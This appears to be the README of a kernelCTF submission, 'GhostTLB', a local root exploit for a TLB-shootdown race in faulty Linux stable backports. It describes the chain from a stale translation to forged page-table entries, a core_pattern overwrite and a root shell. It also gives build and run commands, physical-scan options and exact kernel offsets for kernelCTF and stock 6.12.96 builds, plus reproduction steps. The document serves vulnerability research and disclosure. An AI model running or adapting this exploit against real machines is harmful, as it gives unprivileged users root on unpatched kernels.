# GhostTLB: From a Missed Shootdown to Root

GhostTLB is a single-file Linux kernelCTF exploit for the x86 TLB-shootdown
race left open by faulty stable backports of
[CVE-2025-37964](https://www.cve.org/CVERecord?id=CVE-2025-37964). It turns a
stale userspace translation into a temporary PTE-editing primitive and uses it
to gain root through `core_pattern`.

Linux 6.12.97 fixed the stable-specific ordering bug in
[`0650f1c8b6b0`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=0650f1c8b6b02b3edd489848fb9daa325eccf42c).
The included profiles intentionally stop at 6.12.96.

Credits and shoutout to **HWG Italy Offensive Team, Here We Go Dubai Offensive Team and Equixly**.

## Exploit chain

1. Pin the reader and shooter to different CPUs and churn the reader beyond
   x86's six dynamic ASID slots.
2. Race a delayed context switch against `munmap()` to retain a stale
   translation to a secretmem page.
3. Free that page and reclaim it as a page-table page while a sentinel mapping
   preserves the surrounding hierarchy.
4. Forge fresh PTEs to locate the physical kernel image, then map
   `core_pattern`.
5. Install a temporary pipe helper, trigger it, hand back a PTY-backed root
   shell, restore `core_pattern`, and remove the forged mapping with `munmap()`.

## Proof-of-Concept

https://github.com/user-attachments/assets/cb9f9b79-fa9a-4ff0-a598-9d8fe72a5887

## Requirements

- An exact vulnerable x86-64 kernel build. The embedded profiles support
  kernelCTF 6.12.95 and 6.12.96; other builds require offsets from their exact
  `vmlinux`.
- KVM with at least two vCPUs, `-cpu host`, and access to `/dev/kvm`. TCG is not
  supported because the race depends on real x86 TLB and PCID behavior.
- A kernel with `memfd_secret(2)` enabled.
- GNU Make and a static-capable C toolchain.

## Build

```bash
make check
make
```

The resulting binary is `exploit.static`.

## Usage

Run as an unprivileged user. The default profile and physical scan range target
the kernelCTF 6.12.96 image:

```bash
./exploit.static --kernel 6.12.96
```

Supplying a known physical base is faster and more reliable:

```bash
./exploit.static --kernel 6.12.96 --phys-base 0x23000000
```

To scan a bounded range:

```bash
./exploit.static --kernel 6.12.96 \
  --phys-range 0x10000000 0x3f000000
```

One process can test at most 510 physical candidates. Use adjacent ranges for
larger searches; failed ranges restore their temporary PTE edits.

### Stock upstream 6.12.96

Offsets and physical alignment are build-specific. Derive them from the exact
`vmlinux` used by the guest:

```bash
nm -n vmlinux | awk '$3 == "_text" || $3 == "linux_banner" || $3 == "core_pattern"'
```

Subtract `_text` from `linux_banner` and `core_pattern`. For the tested
`x86_64_defconfig` build:

```bash
./exploit.static \
  --kernel 6.12.96 \
  --banner-offset 0x013825c0 \
  --target-offset 0x01b7b240 \
  --phys-step 0x00200000 \
  --phys-range 0x01000000 0x40000000
```

A successful run ends with `TRIGGER_RESULT ... root=1 cleanup=1`.
`elapsed` measures the exploit through restoration and cleanup;
`shell_elapsed` measures the interactive shell separately.

## kernelCTF reproduction

Install `qemu-system-x86`, `expect`, `inotify-tools`, `uuid-runtime`, and `jq`,
then download Google's published 6.12.96 kernelCTF artifacts:

```bash
git clone --depth=1 https://github.com/google/security-research.git
cd security-research/kernelctf/repro

wget https://storage.googleapis.com/kernelctf-build/releases/lts-6.12.96/bzImage
wget -O rootfs.img.gz \
  https://storage.googleapis.com/kernelctf-build/files/rootfs_repro_v2.img.gz
gzip -d rootfs.img.gz

mkdir -p exp
cp /path/to/GhostTLB/exploit.static exp/exploit
chmod +x exp/exploit

RELEASE_ID=lts-6.12.96 \
EXPLOIT_INFO='{"uses":[],"flag_time":"2026-08-07","requires_separate_kaslr_leak":false}' \
./repro.sh 1
```
